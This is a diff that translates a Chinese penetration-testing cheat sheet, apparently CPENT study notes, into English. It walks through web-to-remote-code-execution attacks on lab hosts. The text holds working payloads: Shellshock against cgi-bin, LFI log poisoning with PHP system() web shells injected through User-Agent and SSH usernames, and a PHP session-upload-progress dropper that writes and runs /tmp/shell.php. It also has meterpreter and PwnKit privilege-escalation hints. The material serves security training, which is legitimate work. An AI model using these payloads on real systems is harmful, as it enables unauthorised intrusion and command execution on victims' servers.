@@ -4,18 +4,18 @@ Web to RCE
 
 # SHELLSHOCK
 ```
-駭客在2014年發現的bash漏洞
-在bash裡面執行語法時如果設定一個環境變數
-env X='() { :; };
-那它後面的指令就會被執行起來
-可以在bash中達到任意程式碼執行的效果
+Bash vulnerability discovered in 2014 (CVE-2014-6271).
+When executing commands in Bash, if an environment variable is exported containing trailing commands after a function definition:
+env X='() { :; }; <command>'
+the commands following the function definition are executed immediately upon invocation,
+achieving arbitrary code execution in Bash.
 
-在那個時代要做動態網頁需要用CGI(為了建立可變式 HTML 所採用的一種方法之一)的技術
-大家用的語言不外乎C、C++、Perl、ShellScript
-這時ShellScript就會出一點問題
+Historically, dynamic web applications relied on CGI (Common Gateway Interface) to generate dynamic HTML.
+Typical languages used included C, C++, Perl, and Shell scripts.
+When CGI scripts invoked Shell scripts, this vulnerability became remotely exploitable over HTTP.
 
-過去幾十年cgi-bin出過最嚴重的漏洞就只有SHELLSHOCK
-所以掃出cgi-bin就要有敏感度會發生什麼事情
+Shellshock is the most critical vulnerability historically affecting /cgi-bin/.
+When directory bruteforcing discovers /cgi-bin/, immediately check for Shellshock.
 ```
 Enviroment
 ```bash
@@ -42,11 +42,11 @@ Parrot
 
 # 1. dirb Path
 dirb http://192.168.0.24
-# dictionary推薦 : /usr/share/dirb/wordlists/common.txt
+# Recommended wordlist: /usr/share/dirb/wordlists/common.txt
 
 # http://192.168.0.24/cgi-bin => 403
-# RFC 2616所謂有效的URL : protocol://host.domain.com/path/resource?query
-# 目前缺resource
+# Valid URL structure under RFC 2616: protocol://host.domain.com/path/resource?query
+# Currently missing the resource/file name
 
 dirb http://192.168.0.24/cgi-bin
 # http://192.168.0.24/cgi-bin/keygen
@@ -68,7 +68,7 @@ meterpreter > shell
 script -c /bin/bash /dev/null
 https://file+.vscode-resource.vscode-cdn.net/c:/Users/Rex/Desktop/GITHUB/PenTest/CPENT-CheatSheet/README.md
 # Privillege Escalation
-uname -a #低版本PwnKit直接K
+uname -a # On older kernels, exploit directly with PwnKit
 
 ```
 tool
@@ -98,10 +98,10 @@ echo '<?php include($_GET["file"]); ?>' >> /var/www/html/inc.php
 chmod 755 -R /var/log/apache2
 chmod 775 -R /proc/self/environ
 # http://192.168.0.10/inc.php?file =/var/log/apache2/access.log
-# 目前可以控制任意檔案瀏覽，那我可不可以控我瀏覽的檔案內容?
-# 答案是可以的可以控制Access中的User-Agent
+# We can view arbitrary files via LFI; can we also control the contents of an included file?
+# Yes: we can poison the User-Agent header in access.log
 User-Agent:<?php system($_GET[cmd]);?>
-# 或者這樣
+# Or via SSH login attempt:
 ssh '<?php system($_GET[cmd]);?>'@172.25.20.6
 
 # http://192.168.0.10/inc.php?file =/var/log/apache2/access.log&cmd=ls
@@ -109,7 +109,7 @@ ssh '<?php system($_GET[cmd]);?>'@172.25.20.6
 
 
 # Authencation
-chmod 775 /var/auth.log  # 身分驗證
+chmod 775 /var/auth.log  # Authentication log
 ssh '<?php system($_GET['cmd']); ?>'@192.168.0.10
 ```
 
@@ -117,22 +117,22 @@ ssh '<?php system($_GET['cmd']); ?>'@192.168.0.10
 > One Line PHP Challenge : https://blog.orange.tw/2018/10/
 ```
 PHP_SESSION_UPLOAD_PROGRESS
-PHP有一個檔案上傳的進度的API
+PHP has a built-in file upload progress API.
 
 
 1. Inclusion Tragedy
 2. Session Tragedy
-    PHP會去記錄每個User的狀態，PHP端會去tmp一個Session File
-    取決於應用程式的運作User或許可以影響到Session File的Content3
+    PHP tracks user state by writing a temporary session file on the server.
+    Depending on application behavior, the user can influence the session file contents.
 3. CleanUp Tragedy
-    Session結束後Session File會被清掉，短暫存在於檔案上傳的期間而已
+    Once the upload finishes, the session file is cleaned up; it exists only briefly during upload.
 4. Prefix Tragedy
-    上傳時可以決定檔案的前綴
+    The upload progress directive prefixes the session content.
 
-結論 : 在PHP檔案上傳的過程中利用進度條的功能，可以控制Session file的內容，而不需要汙染任何的LOG
+Conclusion: By leveraging the progress bar feature during PHP file upload, an attacker can control session file contents without needing to poison any server log files.
 
 ```
-要打PHP_SESSION_UPLOAD_PROGRESS的條件
+Requirements to exploit PHP_SESSION_UPLOAD_PROGRESS:
 ```
 1. PHP > 5.4
 2. Enable File Upload (Default Enabled)
@@ -147,7 +147,7 @@ PHP有一個檔案上傳的進度的API
     - /tmp/
     - /var/lib/php5/
 
-以上可去phpinfo()慢慢看
+Check the settings above in phpinfo()
 ```
 Attack
 ```bash
@@ -158,21 +158,21 @@ python -c 'print "A" * 2048 * 1024' >> junk.txt
 evildropper:<?php file_put_contents('/tmp/shell.php','<?php system($_GET[3])?>'); ?>
 
 # 3.Test File Upload
-# 有趣的是網頁根本沒有實作檔案上傳功能，但只要做出檔案上傳的動作，PHP就會以為有檔案在上傳
+# Note: Even if the application has no file upload functionality, sending an upload request triggers PHP's internal upload progress mechanism
 curl http://192.168.0.10/inc.php 
--H 'Cookie: PHPSESSID=uploadupload'  #用Cookie控制Server端檔案內容
--F 'PHP_SESSION_UPLOAD_PROGRESS=evildropper' # 上傳的進度條名稱
--F 'files=@junk.txt' # 檔案上傳
+-H 'Cookie: PHPSESSID=uploadupload'  # Control server-side session filename using Cookie
+-F 'PHP_SESSION_UPLOAD_PROGRESS=evildropper' # Name of upload progress / injected content
+-F 'files=@junk.txt' # File payload to maintain upload connection
 
-# 4.開另外一個Terminal 看檔案上傳是否成功
+# 4. Open another terminal to check if upload/inclusion succeeds:
 while true; do (curl -s 'http://<ip_addr>/inc.php?file=/var/lib/php5/sess_uploadupload' | grep evildropper); done
 
-# 5.測試沒問題後，傳真的dropper上去
+# 5. Once verified, upload the real dropper payload:
 curl http://<ip_addr>/inc.php -H 'Cookie: PHPSESSID=uploadupload' 
 -F 'PHP_SESSION_UPLOAD_PROGRESS=<evildropper.txt' 
 -F 'files=@junk.txt'
 
-# 6.上傳成功後，執行Shell
+# 6. After successful upload, execute the shell:
 curl -s 'http://<ip_addr>/inc.php?file=/tmp/shell.php&3=id
 ```
 
@@ -193,7 +193,7 @@ exit
 
 # Fix File Upload
 nano /etc/php5/apache2/php.ini
-[Ctrl-W] OR [F6] upload_max_filesize 改個20M
+[Ctrl-W] OR [F6] Change upload_max_filesize to 20M
 service apache2 restart
 
 
@@ -203,7 +203,7 @@ http://192.168.0.10/wordpress/wp-admin
 # plugin
 WordPress Plugin Site Editor 1.1.1 - Local File Inclusion
 https://www.exploit-db.com/exploits/44340
-# plugin本身就是zip檔案，直接裝上去，啟動即可
+# The plugin is a zip file; install directly and activate
 ```
 POC
 ```bash
